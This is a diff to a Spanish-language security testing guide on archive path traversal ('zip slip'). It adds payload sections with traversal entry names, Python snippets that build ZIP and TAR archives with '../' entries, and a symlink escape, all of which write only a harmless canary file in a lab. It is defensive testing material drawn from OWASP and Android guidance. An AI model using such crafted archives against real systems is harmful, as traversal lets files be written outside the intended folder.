@@ -8,7 +8,71 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Nombres de entrada que salen de la raíz
+
+```text
+../canary-{NONCE}.txt
+../../canary-{NONCE}.txt
+..\canary-{NONCE}.txt
+/tmp/canary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** Son nombres dentro del archivo comprimido, no URLs. Las barras inversas importan sobre todo en Windows; algunas librerías eliminan la barra inicial. Usar sandbox y canary nuevo.
+
+**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+
+
+### Crear un ZIP con canary de recorrido
+
+```python
+import zipfile
+with zipfile.ZipFile("canary-{NONCE}.zip", "x") as z:
+    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
+```
+
+**Cuándo usarlo:** Extraer solo en laboratorio; comprobar ruta final normalizada y ausencia de sobrescritura.
+
+**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+
+
+## 🧭 Payloads por contexto
+
+### TAR con una entrada relativa al padre
+
+```python
+import io, tarfile
+with tarfile.open("canary-{NONCE}.tar", "x") as tar:
+    data = b"prueba controlada"
+    info = tarfile.TarInfo("../canary-{NONCE}.txt")
+    info.size = len(data)
+    tar.addfile(info, io.BytesIO(data))
+```
+
+**Cuándo usarlo:** Una aplicación puede usar librerías distintas para ZIP y TAR; verificar ambos solo si los acepta.
+
+**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+
+
+## 🔥 Payloads avanzados
+
+### Escape por symlink de laboratorio
+
+```text
+Raíz: ./salida
+Symlink propio: ./salida/enlace -> ../
+Entrada ZIP: enlace/canary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** La validación debe considerar la ruta final real. No apuntar a archivos preexistentes.
+
+**Fuente:** [Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Entrada ZIP con ../
 
@@ -22,7 +86,7 @@ with zipfile.ZipFile("canary.zip", "w") as z:
 
 **Interpretación:** Extraer solo en sandbox propio y comprobar si el canary queda fuera de la carpeta prevista.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 2. Dos niveles de salida
 
@@ -34,7 +98,7 @@ Entrada de archivo dentro de ZIP: ../../canary-{NONCE}.txt
 
 **Interpretación:** La ruta debe rechazarse o quedar dentro de raíz normalizada; crear únicamente archivo inocuo.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 3. Separador Windows
 
@@ -46,7 +110,7 @@ Entrada de archivo dentro de ZIP: ..\canary-{NONCE}.txt
 
 **Interpretación:** En Unix la barra puede ser un carácter literal; confirmar sistema y ruta final.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 4. Ruta absoluta
 
@@ -58,7 +122,7 @@ Entrada de archivo dentro de ZIP: /tmp/canary-{NONCE}.txt
 
 **Interpretación:** Solo en laboratorio propio. Algunas librerías eliminan la barra inicial; verificar el archivo real.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 5. Entrada TAR traversal
 
@@ -74,7 +138,7 @@ with tarfile.open("canary.tar", "w") as t:
 
 **Interpretación:** Algunos extractores manejan ZIP y TAR con bibliotecas distintas; no asumir el mismo resultado.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 6. Orden de normalización
 
@@ -87,7 +151,7 @@ Control: ../canary-{NONCE}.txt
 
 **Interpretación:** Un extractor ZIP estándar trata % como literal. El caso es relevante solo con decodificación adicional.
 
-**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
+**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).
 
 ### 7. Comprobación del destino final
 
@@ -101,7 +165,7 @@ Entrada ZIP: enlace/canary-{NONCE}.txt
 
 **Interpretación:** Solo entorno propio. El extractor debe resolver ruta final y evitar escapes por symlink.
 
-**Fuente técnica:** [documentación de la técnica](https://developer.android.com/privacy-and-security/risks/zip-path-traversal).
+**Fuente técnica:** [Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal).
 
 ## ✅ Evidencia mínima
 
